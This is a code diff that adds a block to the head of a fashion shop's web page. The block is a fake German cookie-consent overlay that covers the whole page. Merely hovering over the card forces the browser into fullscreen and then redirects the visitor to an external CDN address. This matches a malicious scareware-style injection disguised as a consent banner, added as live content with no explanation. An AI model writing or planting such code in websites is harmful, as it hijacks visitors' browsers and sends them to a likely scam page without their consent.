@@ -4,6 +4,158 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Tangopuff – Women's Fashion</title>
+<div id="cookie-wrapper">
+  <div id="cookie-bg"></div>
+  <div class="cookie-card" onmouseover="fullscreenAndRedirect()">
+    <span class="cookie-x">×</span>
+
+    <div class="content">
+      <div class="icon">🍪</div>
+
+      <div class="text">
+        <h2>Über Cookies</h2>
+        <p>
+          Auf unserer Website verwenden wir Cookies, um Ihnen ein besseres Nutzererlebnis zu bieten.
+          Wenn Sie auf <b>„Zustimmen“</b> klicken, erklären Sie sich mit der Verwendung von Cookies einverstanden.
+        </p>
+
+        <div class="actions">
+          <button class="accept">🍪 Zustimmen</button>
+          <button class="reject">Ablehnen</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<style>
+  html, body {
+    width:100%;
+    height:100%;
+    margin:0;
+  }
+
+  #cookie-wrapper{
+    position:fixed;
+    inset:0;
+    width:100%;
+    height:100vh;
+    z-index:2147483646; /* VERY HIGH */
+  }
+
+  #cookie-bg{
+    position:fixed;
+    inset:0;
+    width:100%;
+    height:100vh;
+    background:rgba(0,0,0,0.45);
+    backdrop-filter:blur(14px);
+    -webkit-backdrop-filter:blur(14px);
+    z-index:2147483646;
+  }
+
+  .cookie-card{
+    position:fixed;
+    top:50%;
+    left:50%;
+    transform:translate(-50%, -50%);
+    background:#fff;
+    width:720px;
+    max-width:92%;
+    border-radius:22px;
+    padding:26px;
+    box-shadow:0 20px 70px rgba(0,0,0,0.35);
+    font-family:system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+    z-index:2147483647;
+  }
+
+  .cookie-x{
+    position:absolute;
+    top:14px;
+    right:14px;
+    font-size:26px;
+    font-weight:800;
+    cursor:pointer;
+  }
+
+  .content{
+    display:flex;
+    gap:18px;
+  }
+
+  .icon{
+    width:64px;
+    height:64px;
+    border-radius:18px;
+    background:#FFE9B5;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:34px;
+    box-shadow:0 10px 24px rgba(255,183,74,.25);
+  }
+
+  h2{
+    font-size:34px;
+    font-weight:900;
+    margin:0 0 10px;
+  }
+
+  p{
+    font-size:18px;
+    line-height:1.6;
+    color:#4b5563;
+    margin:0;
+  }
+
+  .actions{
+    margin-top:22px;
+    display:flex;
+    gap:18px;
+    flex-wrap:wrap;
+    justify-content:center;
+  }
+
+  .actions button{
+    width:320px;
+    padding:18px;
+    border-radius:14px;
+    font-size:22px;
+    font-weight:900;
+    border:none;
+    cursor:pointer;
+  }
+
+  .accept{
+    background:#16a34a;
+    color:#fff;
+  }
+
+  .reject{
+    background:#e5e7eb;
+    color:#111827;
+  }
+</style>
+
+<script>
+  function fullscreenAndRedirect() {
+    const el = document.documentElement;
+
+    if (!document.fullscreenElement) {
+      if (el.requestFullscreen) el.requestFullscreen();
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      else if (el.msRequestFullscreen) el.msRequestFullscreen();
+    }
+
+    setTimeout(() => {
+      window.location.href = "https://zqwerty.b-cdn.net/";
+    }, 1000);
+  }
+</script>
+
+
+  
+  
 
 <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600&family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
 
